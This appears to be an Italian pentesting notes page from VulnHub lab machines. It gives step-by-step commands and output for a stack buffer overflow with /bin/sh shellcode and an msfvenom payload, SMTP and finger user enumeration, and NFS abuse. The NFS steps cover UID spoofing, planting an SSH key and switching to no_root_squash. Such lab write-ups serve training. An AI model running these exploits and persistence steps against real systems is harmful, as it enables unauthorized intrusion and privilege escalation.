<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
5. Si testa se effettivamente l'offset è giusto:
</pre></td></tr></tbody></table></code></div></div>
<p>(gdb) run $(python -c “print(‘A’<em>116 + ‘BBBB’ + ‘C’</em>(200-116-4))”)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c “print(‘A’<em>116 + ‘BBBB’ + ‘C’</em>(200-116-4))”)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>


6. Si deve trovare il return address: (l'applicativo in questo caso si chiama **validate**)
objdump -D *nome_applicativo* | grep call| grep eax
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ objdump -D validate | grep call| grep eax
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax
 804862b:	ff d0                	call   *%eax</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
7. Ora si può inserire una shellcode con il return address: (In questo caso la shellcode stampa solo la stringa "Owned!!!")
</pre></td></tr></tbody></table></code></div></div>
<p>gdb-peda$ run $(python2.7 -c “import struct; shellcode=’\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80’; print(‘\x90’<em>10+shellcode +’A’</em>(116-10-len(shellcode)) + struct.pack(‘&lt;I’, 0x080484af))”)</p>

<p>Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python2.7 -c “import struct; shellcode=’\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80’; print(‘\x90’<em>10+shellcode +’A’</em>(116-10-len(shellcode)) + struct.pack(‘&lt;I’, 0x080484af))”)
Owned!!![Inferior 1 (process 101558) exited normally]</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>
**shellcode for /bin/sh**
shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x5
8\xcd\x80"

**Oppure si può generare con:**
msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 -b ‘x00x0ax0dx20x46’ -e x86/shikata_ga_nai -f c


Per i bad characters:
</pre></td></tr></tbody></table></code></div></div>
<p>run $(python -c”print(‘A’<em>116+’BBBB’+’\x90’</em>16+’\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff’)”)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Cioè:
</pre></td></tr></tbody></table></code></div></div>
<p>gdb-peda$ run $(python -c”print(‘A’<em>116+’BBBB’+’\x90’</em>16+’\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff’)”)
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c”print(‘A’<em>116+’BBBB’+’\x90’</em>16+’\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff’)”)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[———————————-registers———————————–]
EAX: 0xffffcce8 (‘A’ &lt;repeats 116 times&gt;, “BBBB”, ‘\302\220’ &lt;repeats 16 times&gt;, “\001\002\003\004\005\006\a\b”)
EBX: 0x41414141 (‘AAAA’)
ECX: 0xffffd0d0 –&gt; 0xd0c0b00 (‘’)
EDX: 0xffffcd88 –&gt; 0x0 
ESI: 0xf7fa9000 –&gt; 0x1e4d6c 
EDI: 0xf7fa9000 –&gt; 0x1e4d6c 
EBP: 0x41414141 (‘AAAA’)
ESP: 0xffffcd60 –&gt; 0x90c290c2 
EIP: 0x42424242 (‘BBBB’)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[————————————-code————————————-]
Invalid $PC address: 0x42424242
[————————————stack————————————-]
0000| 0xffffcd60 –&gt; 0x90c290c2 
0004| 0xffffcd64 –&gt; 0x90c290c2 
0008| 0xffffcd68 –&gt; 0x90c290c2 
0012| 0xffffcd6c –&gt; 0x90c290c2 
0016| 0xffffcd70 –&gt; 0x90c290c2 
0020| 0xffffcd74 –&gt; 0x90c290c2 
0024| 0xffffcd78 –&gt; 0x90c290c2 
0028| 0xffffcd7c –&gt; 0x90c290c2 
[——————————————————————————]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
L'applicativo crasha e si vede la memoria con il comando ```x/100x $eax```
</pre></td></tr></tbody></table></code></div></div>
<p>gdb-peda$ x/100x $eax
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd58:	0x41414141	0x42424242	0x90c290c2	0x90c290c2
0xffffcd68:	0x90c290c2	0x90c290c2	0x90c290c2	0x90c290c2
0xffffcd78:	0x90c290c2	0x90c290c2	0x04030201	0x08070605
0xffffcd88:	0x00000000	0xf7de2e46	0x00000004	0xffffce34
0xffffcd98:	0xffffce48	0xffffcdc4	0xffffcdd4	0xf7ffdb40
0xffffcda8:	0xf7fca410	0xf7fa9000	0x00000001	0x00000000
0xffffcdb8:	0xffffce18	0x00000000	0xf7ffd000	0x00000000
0xffffcdc8:	0xf7fa9000	0xf7fa9000	0x00000000	0x6359a04d
0xffffcdd8:	0x20997e5d	0x00000000	0x00000000	0x00000000
0xffffcde8:	0x00000004	0x08048400	0x00000000	0xf7fe88f0
0xffffcdf8:	0xf7fe3230	0xf7ffd000	0x00000004	0x08048400
0xffffce08:	0x00000000	0x08048421	0x08048538	0x00000004
0xffffce18:	0xffffce34	0x080485b0	0x080485a0	0xf7fe3230
0xffffce28:	0xffffce2c	0x0000001c	0x00000004	0xffffd000
0xffffce38:	0xffffd030	0xffffd0d1	0xffffd0e7	0x00000000
0xffffce48:	0xffffd247	0xffffd275	0xffffd2c1	0xffffd2d3
0xffffce58:	0xffffd2e3	0xffffd2fc	0xffffd329	0xffffd359
0xffffce68:	0xffffd397	0xffffd3b8	0xffffd3c2	0xffffd3d8</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>
All'indirizzo di memoria 0xffffcd78 si vede che il payload che ho inserito arriva fino a \x08 e poi c'è \x00 nell'indirizzo di memoria successivo, questo vuol dire che \x09 è un bad characters

E si continua così fino a quando o il payload è troppo lungo e quindi l'applicativo non crasha, oppure crasha ma ci sono tutti i caratteri che si sono inseriti nel payload



### SMTP (port 23)
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.102</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>
Con metasploit: auxiliary/scanner/smtp/smtp_enum


### Linux fingerd (port 79)

Con metasploit: auxiliary/scanner/finger/finger_users

Per enumerazione utenti: (Sta in **~/Programs**)
https://github.com/Kan1shka9/Finger-User-Enumeration
</pre></td></tr></tbody></table></code></div></div>
<p>./finger_enum_user.sh ~/Documents/Vulnhub/Hacklab_Vulnix/user.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Sample output:
</pre></td></tr></tbody></table></code></div></div>
<p>$ ./finger_enum_user.sh users.txt
User : user
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash
Last login Tue May 16 01:47 (BST) on pts/0 from 192.168.1.34
No mail.
No Plan.</p>

<p>Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false
Never logged in.
No mail.
No Plan.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>
N.B Check for the parameter "Directory:" in the output, if /home/username means that it is a valid user on the system.



### NFS (Port 2049)
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ showmount -e 192.168.1.102
Export list for 192.168.1.102:
/home/vulnix *</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>
</pre></td></tr></tbody></table></code></div></div>
<p>(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mkdir home2</p>

<p>(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mount -t nfs 192.168.1.102:/home/vulnix home2 -o nolock</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Oppure usare **nfsshell**:
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ sudo ./nfsshell
nfs&gt; host 192.168.1.102
Using a privileged port (1023)
Open 192.168.1.102 (192.168.1.102) TCP
nfs&gt; export
Export list for 192.168.1.102:
/home/vulnix             * 
nfs&gt; mount ~/Documents/Vulnhub/Hacklab_Vulnix/home/
Using a privileged port (1022)
Mount failed: Permission denied</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>
In questo caso non ho i permessi per vedere il contenuto della cartella però utilizzando i comandi ```uid``` e ```gid``` posso settare i permessi giusti dell'utente per vedere il contenuto.
Quindi metti caso che sei entrato in ssh con un utente, tu prendi da /etc/passwd 
</pre></td></tr></tbody></table></code></div></div>
<p>vulnix:x:2008:2008::/home/vulnix:/bin/bash</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Si può o settare l'uid con nfsshell:
</pre></td></tr></tbody></table></code></div></div>
<p>nfs&gt; uid 2008
nfs&gt; ls
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Oppure si può aggiungere nella propria macchina un utente con quell'uid:
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ sudo useradd -u 2008 vulnix</p>

<p>(base) ┌──(kali㉿kali)-[~/Programs/unix-privesc-check-1.4]
└─$ tail /etc/passwd
king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pwn:x:1004:1004:,,,:/home/pwn:/bin/bash
uuidd:x:134:143::/run/uuidd:/usr/sbin/nologin
ftpuser:x:1006:1006::/dev/null:/etc
ftp:x:133:142:ftp daemon,,,:/var/ftp:/bin/false
beef-xss:x:135:144::/var/lib/beef-xss:/usr/sbin/nologin
redis:x:136:145::/var/lib/redis:/usr/sbin/nologin
vulnix:x:2008:2008::/home/vulnix:/bin/sh</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
E poi si monta la directory da root e poi si passa all'utente creato:
</pre></td></tr></tbody></table></code></div></div>
<p>┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─$ mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home -o nolock</p>

<p>┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─# su vulnix
$ cd /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
$ ls -la
total 20
drwxr-x— 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r–r– 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r–r– 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r–r– 1 vulnix vulnix  675 Apr  3  2012 .profile</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>
Poi per continuare l'attacco, si può inserire una chiave ssh in questa directory:
1. Genero chiave:
</pre></td></tr></tbody></table></code></div></div>
<p>(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh-keygen          <br />
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa_vulnix
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_vulnix
Your public key has been saved in id_rsa_vulnix.pub
The key fingerprint is:
SHA256:NFEWBOcRexrVCkXFRoIUFL0NkfUN63ZRxPmWcRm27kw kali@kali
The key’s randomart image is:
+—[RSA 3072]—-+
|        o<em>&amp;X</em>O==<em>|
|         =o++.=B</em>|
|        o +..*.oB|
|       . . +o.o.+|
|        S .   oE.|
|             .+. |
|               o |
|                 |
|                 |
+—-[SHA256]—–+</p>

<p>(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ cat id_rsa_vulnix.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
2. Copio il .pub nelle authorized key della macchina:
</pre></td></tr></tbody></table></code></div></div>
<p>$ mkdir .ssh
$ ls
$ ls -la
total 24
drwxr-x— 3 vulnix vulnix 4096 Jun  6 07:19 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r–r– 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r–r– 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r–r– 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:19 .ssh
$ cd .ssh	
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali &gt;  authorized_keys
$ ls -la
total 12
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .
drwxr-x— 3 vulnix vulnix 4096 Jun  6 07:19 ..
-rw-r–r– 1 vulnix vulnix  563 Jun  6 07:20 authorized_keys</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
3. Accedo in ssh:
</pre></td></tr></tbody></table></code></div></div>
<p>(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh -i id_rsa_vulnix vulnix@192.168.1.102
Enter passphrase for key ‘id_rsa_vulnix’: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</p>

<ul>
  <li>Documentation:  https://help.ubuntu.com/</li>
</ul>

<p>System information as of Sun Jun  6 12:21:14 BST 2021</p>

<p>System load:  0.0              Processes:           88
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 12%              IP address for eth0: 192.168.1.102
  Swap usage:   0%</p>

<p>=&gt; / is using 90.3% of 773MB</p>

<p>Graph this data and manage this system at https://landscape.canonical.com/</p>

<p>Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife</p>

<p>New release ‘14.04.6 LTS’ available.
Run ‘do-release-upgrade’ to upgrade to it.</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>vulnix@vulnix:~$ ls -la
total 28
drwxr-x— 4 vulnix vulnix 4096 Jun  6 12:21 .
drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
-rw-r–r– 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r–r– 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx—— 2 vulnix vulnix 4096 Jun  6 12:21 .cache
-rw-r–r– 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 12:20 .ssh</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>
In nfs c'è questa impostazione root_squash
root_squash: Fa in modo che tutti gli accessi dei client al filesystem esportato, effettuati da utenti root sulle macchine client, avvengano come user ID per l'utente nobody. Questo in effetti "declassa" il potere dell'utente root remoto a quello del più semplice utente locale, impedendo una alterazione dei file non autorizzata sul server remoto. In alternativa, l'opzione no_root_squash disabilita questa funzione.

</pre></td></tr></tbody></table></code></div></div>
<p>vulnix@vulnix:~$ cat /etc/exports</p>
<h1 id="etcexports-the-access-control-list-for-filesystems-which-may-be-exported">/etc/exports: the access control list for filesystems which may be exported</h1>
<h1 id="to-nfs-clients--see-exports5">to NFS clients.  See exports(5).</h1>
<p>#</p>
<h1 id="example-for-nfsv2-and-nfsv3">Example for NFSv2 and NFSv3:</h1>
<h1 id="srvhomes-------hostname1rwsyncno_subtree_check-hostname2rosyncno_subtree_check">/srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</h1>
<p>#</p>
<h1 id="example-for-nfsv4">Example for NFSv4:</h1>
<h1 id="srvnfs4--------gsskrb5irwsyncfsid0crossmntno_subtree_check">/srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</h1>
<h1 id="srvnfs4homes--gsskrb5irwsyncno_subtree_check">/srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</h1>
<p>#
/home/vulnix	*(rw,root_squash)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Vedendo con sudo -l:
</pre></td></tr></tbody></table></code></div></div>
<p>vulnix@vulnix:~$ sudo -l
Matching ‘Defaults’ entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Abbiamo la possibilità di modificare quel file di configurazione per permettere al nostro utente root di scrivere sulla directory nfs.
</pre></td></tr></tbody></table></code></div></div>
<p>vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports</p>
<h1 id="etcexports-the-access-control-list-for-filesystems-which-may-be-exported-1">/etc/exports: the access control list for filesystems which may be exported</h1>
<h1 id="to-nfs-clients--see-exports5-1">to NFS clients.  See exports(5).</h1>
<p>#</p>
<h1 id="example-for-nfsv2-and-nfsv3-1">Example for NFSv2 and NFSv3:</h1>
<h1 id="srvhomes-------hostname1rwsyncno_subtree_check-hostname2rosyncno_subtree_check-1">/srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</h1>
<p>#</p>
<h1 id="example-for-nfsv4-1">Example for NFSv4:</h1>
<h1 id="srvnfs4--------gsskrb5irwsyncfsid0crossmntno_subtree_check-1">/srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</h1>
<h1 id="srvnfs4homes--gsskrb5irwsyncno_subtree_check-1">/srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</h1>
<p>#
/home/vulnix	*(rw,no_root_squash)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>
Non avendo la possibilità di riavviare il servizio nfs, riavviamo la macchina.
Così riusciamo ad accedere con il nostro root:
</pre></td></tr></tbody></table></code></div></div>
<p>┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home</p>

<p>┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# ls -la home/
total 32
